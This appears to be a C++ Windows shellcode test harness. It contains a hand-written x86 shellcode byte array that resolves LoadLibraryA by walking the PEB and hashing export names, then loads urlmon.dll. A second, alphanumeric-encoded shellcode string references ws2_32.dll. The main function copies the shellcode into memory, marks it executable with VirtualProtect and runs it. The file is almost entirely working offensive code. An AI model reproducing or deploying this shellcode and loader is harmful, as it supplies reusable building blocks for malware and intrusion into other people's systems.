#include <Windows.h>

#pragma warning(disable:4996)
extern "C" void __stdcall loadLibraryA();
extern "C" long __cdecl stringHash(char*);

char shLoadLibraryA[] = { 
    //60 8b c4 e8 ff ff ff ff 30 58 58 83 e8 08 8b d8
    //b9 c3 ff ff ff f7 d9 03 c1 ff d0 8b d3 b9 ad ff
    //ff ff f7 d9 03 d1 be 8e 4e 0e ec ff d2 8b d3 b9
    //5f ff ff ff f7 d9 03 d1 52 ff d0 61 c3 56 33 c0
    //64 8b 40 30 8b 40 0c 8b 70 0c ad 8b f0 ad 8b 40
    //18 5e c3 60 8b 6c 24 1c 8b 45 3c 8b 54 28 78 03
    //d5 8b 4a 18 8b 5a 20 03 dd e3 34 49 8b 34 8b 03
    //f5 33 ff 33 c0 fc ac 84 c0 74 07 c1 cf 0d 03 f8
    //eb f4 3b 7c 24 04 75 e1 8b 5a 24 03 dd 66 8b 0c
    //4b 8b 5a 1c 03 dd 8b 04 8b 03 c5 89 44 24 1c 61
    //c3 77 73 32 5f 33 32 2e 64 6c 6c 00

    "\x60\x8b\xc4\xe8\xff\xff\xff\xff\x30\x58\x58\x83\xe8\x08\x8b\xd8"
    "\xb9\xc3\xff\xff\xff\xf7\xd9\x03\xc1\xff\xd0\x8b\xd3\xb9\xad\xff"
    "\xff\xff\xf7\xd9\x03\xd1\xbe\x8e\x4e\x0e\xec\xff\xd2\x8b\xd3\xb9"
    "\x5f\xff\xff\xff\xf7\xd9\x03\xd1\x52\xff\xd0\x61\xc3\x56\x33\xc0"
    "\x64\x8b\x40\x30\x8b\x40\x0c\x8b\x70\x0c\xad\x8b\xf0\xad\x8b\x40"
    "\x18\x5e\xc3\x60\x8b\x6c\x24\x1c\x8b\x45\x3c\x8b\x54\x28\x78\x03"
    "\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3\x34\x49\x8b\x34\x8b\x03"
    "\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8"
    "\xeb\xf4\x3b\x7c\x24\x04\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c"
    "\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\x89\x44\x24\x1c\x61"
    "\xc3"
    "urlmon.dll"
};


char* pLoadLibrary = 
    "hffffk4diFkTpj02Tpk0T0AuEE2E4y4A3L4F8K5N8L1L0l7N5K337m3U3p3e3b4s8O4S3P4W064J8L3s5L5N4J3h8L4O8L4R3z0a3u8M4v112Z5O8L4B5O4D"
    "4I0i8K4u3W5K3z0p3t7N3Z5n0U4I0e1k3h2H5O2o183W0t1n4x2j7l8L4x4E4U3V0t0n0o3b0R3A0Y0k2D3W0q1N5N7K7L7l075l5K2C7p3P0n0U004J3F1O"
    "0z3a143k004A144q104Z3Y3R4t4U1p0N3a4j7l0h8K4C3V0s0I0k062z8P4s0i0s03390W3u08034y002K0o3u3W003c075p5M2q2w0J0Q4w00"
    "ws2_32.dll";

void main()
{
    //long lHash = stringHash("LoadLibraryA");
    //loadLibraryA();

    ////char* pStr = (char*)loadLibraryA;
    ////char* pStr = pLoadLibrary;
    char* pStr = shLoadLibraryA;
    size_t strLen = strlen(pStr);

    PCHAR pMem = new char [strLen]; 
    if (!pMem)
        return;
    strcpy(pMem, pStr);
    DWORD dwOldPermissions = 0;
    VirtualProtect(pMem, strLen, PAGE_EXECUTE_READWRITE, &dwOldPermissions);

    typedef void (__stdcall *shellcode_t)();
    shellcode_t pShellcode = (shellcode_t)pMem;
    pShellcode();

    delete [] pMem;
}